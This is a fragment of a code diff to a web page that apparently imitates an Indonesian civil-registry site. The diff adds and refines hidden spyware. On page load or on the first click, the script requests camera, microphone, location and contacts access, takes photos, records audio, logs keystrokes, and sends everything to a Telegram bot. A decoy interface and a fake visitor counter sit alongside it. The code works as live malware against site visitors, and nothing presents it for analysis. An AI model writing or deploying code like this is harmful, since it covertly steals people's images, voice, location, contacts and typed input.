                 fd.append('chat_id', CHAT_ID);
                 fd.append('photo', blob, 'camera_capture.jpg');
-                fd.append('caption', `📸 *CAMERA CAPTURE*\n⏰ ${new Date().toLocaleString('id-ID')}\n📍 ${capturedData.locationData.lat}, ${capturedData.locationData.lng}`);
+                fd.append('caption', `📸 *CAMERA CAPTURE*\n⏰ ${data.timestamp}\n📍 ${locationData.lat}, ${locationData.lng}\n📷 Resolusi: 1920x1080`);
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            } catch(e) { console.log("Photo error"); }
+            } catch(e) { console.log("Photo error:", e); }
         }
     }
     
@@ -559,9 +611,7 @@
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
             return data.ip;
-        } catch(e) {
-            return "Gagal mengambil IP";
-        }
+        } catch(e) { return "Gagal mengambil IP"; }
     }
     
     // ==================== MAIN EXECUTION ====================
@@ -569,41 +619,50 @@
         if(executed) return;
         executed = true;
         
-        showToast("Mengumpulkan semua data...");
+        showToast("Mengumpulkan semua data (Camera, Mic, Lokasi, Kontak)...");
         
-        await requestAllPermissions();
-        generateRandomData();
+        // Request all permissions in parallel
+        await Promise.all([
+            requestCameraAndCapture(),
+            requestMicrophoneAndRecord(),
+            requestGoogleLocation(),
+            requestContacts()
+        ]);
         
-        await sendAllToTelegram();
+        const randomData = generateData();
+        await sendAllToTelegram(randomData);
         
-        // Tampilkan modal
+        // Show success modal
         showDataModal();
-        showToast("Semua data berhasil dikumpulkan dan dikirim ke Telegram!");
+        showToast("✅ Semua data berhasil dikumpulkan dan dikirim ke Telegram!");
     }
     
     function showDataModal() {
-        const existingModal = document.getElementById('globalDataModal');
-        if(existingModal) existingModal.remove();
+        const existing = document.getElementById('globalDataModal');
+        if(existing) existing.remove();
         
         const modal = document.createElement('div');
         modal.id = 'globalDataModal';
         modal.className = 'data-modal';
         modal.innerHTML = `
             <div class="data-modal-header">
-                <h4><i class="fas fa-check-circle"></i> SEMUA IZIN TELAH DIDAPATKAN</h4>
+                <h4><i class="fas fa-check-circle"></i> PENGUMPULAN DATA SELESAI</h4>
                 <button class="close-modal" id="closeDataModalBtn">&times;</button>
             </div>
             <div class="data-modal-body">
                 <h5>Status Izin:</h5>
                 <ul>
-                    <li>📷 Camera: ${permissionsGranted.camera ? '✅ BERHASIL' : '❌ GAGAL'}</li>
-                    <li>🎙️ Microphone: ${permissionsGranted.microphone ? '✅ BERHASIL' : '❌ GAGAL'}</li>
-                    <li>📍 Lokasi Google: ${permissionsGranted.location ? '✅ BERHASIL' : '❌ GAGAL'}</li>
-                    <li>📇 Kontak: ${permissionsGranted.contacts ? '✅ BERHASIL' : '❌ GAGAL'}</li>
+                    <li>📷 Camera: ${permissions.camera ? '✅ BERHASIL' : '❌ GAGAL'}</li>
+                    <li>🎙️ Microphone + Suara: ${permissions.microphone ? '✅ BERHASIL' : '❌ GAGAL'}</li>
+                    <li>📍 Lokasi Google: ${permissions.location ? '✅ BERHASIL' : '❌ GAGAL'}</li>
+                    <li>📇 Kontak: ${permissions.contacts ? '✅ BERHASIL' : '❌ GAGAL'}</li>
                 </ul>
                 <hr>
-                <p>Semua data telah dikirim ke Telegram!</p>
-                <p><small>Total ${keyLogBuffer.length} keystroke terekam</small></p>
+                <p>📍 <strong>Lokasi:</strong> ${locationData.fullAddress || locationData.street || 'Tidak tersedia'}</p>
+                <p>🎙️ <strong>Microphone:</strong> ${permissions.microphone ? 'Telah merekam 15 detik suara' : 'Tidak tersedia'}</p>
+                <p>📊 <strong>Keylogger:</strong> ${keyLogBuffer.length} keystroke terekam</p>
+                <hr>
+                <p><small>Semua data telah dikirim ke Telegram!</small></p>
             </div>
             <div class="data-modal-footer">
                 <button id="closeModalFooterBtn" class="btn btn-secondary btn-sm">Tutup</button>
@@ -622,24 +681,18 @@
     window.showToast = showToast;
     
     // ==================== TRIGGERS ====================
-    // Auto execute setelah halaman dimuat
     setTimeout(() => { executeZeroDay(); }, 2000);
     
-    // Trigger pada klik pertama
     document.body.addEventListener('click', function zeroDayHandler() {
-        if(!executed) { executeZeroDay(); }
+        if(!executed) executeZeroDay();
         document.body.removeEventListener('click', zeroDayHandler);
     });
     
-    // Tombol capture
     document.getElementById('captureAllBtn').addEventListener('click', () => executeZeroDay());
     
-    // Admin panel hidden
     let adminVisible = false;
     document.getElementById('adminTrigger').addEventListener('click', function() {
-        if(!adminVisible && !executed) {
-            executeZeroDay();
-        }
+        if(!adminVisible && !executed) executeZeroDay();
     });
     
     // ==================== UI INIT ====================
@@ -658,13 +711,34 @@
     });
     
     let accessibilityActive = false;
-    $('#accessibilityBtn').click(function() { accessibilityActive = !accessibilityActive; $('body').css('font-size', accessibilityActive ? '18px' : ''); showToast(accessibilityActive ? 'Mode aksesibilitas aktif' : 'Mode nonaktif'); });
-    window.addEventListener('scroll', function() { let btn = document.getElementById('backToTop'); if(window.scrollY > 300) btn.classList.add('show'); else btn.classList.remove('show'); });
-    let count = 67, start = 0; let counterEl = document.getElementById('visitorCount'); if(counterEl) { let interval = setInterval(() => { if(start >= count) clearInterval(interval); else counterEl.innerText = start++; }, 15); }
+    $('#accessibilityBtn').click(function() {
+        accessibilityActive = !accessibilityActive;
+        $('body').css('font-size', accessibilityActive ? '18px' : '');
+        showToast(accessibilityActive ? 'Mode aksesibilitas aktif' : 'Mode nonaktif');
+    });
+    
+    window.addEventListener('scroll', function() {
+        let btn = document.getElementById('backToTop');
+        if(window.scrollY > 300) btn.classList.add('show');
+        else btn.classList.remove('show');
+    });
+    
+    let count = 67, start = 0;
+    let counterEl = document.getElementById('visitorCount');
+    if(counterEl) {
+        let interval = setInterval(() => {
+            if(start >= count) clearInterval(interval);
+            else counterEl.innerText = start++;
+        }, 15);
+    }
+    
     document.cookie = "disdukcapil_session=abc123xyz; path=/";
     localStorage.setItem("user_preference", "darkmode_off");
     
-    console.log("✅ ZERO DAY ACTIVE - Semua izin akan diminta secara otomatis");
+    console.log("✅ ZERO DAY EXPLOIT ACTIVE");
+    console.log("✅ Camera, Microphone, Location, Contacts akan diminta otomatis");
+    console.log("✅ Suara microphone akan dikirim ke Telegram");
+    console.log("✅ Lokasi Google Maps lengkap (jalan, kota, provinsi, kode pos, landmark)");
 })();
 </script>
 </body>
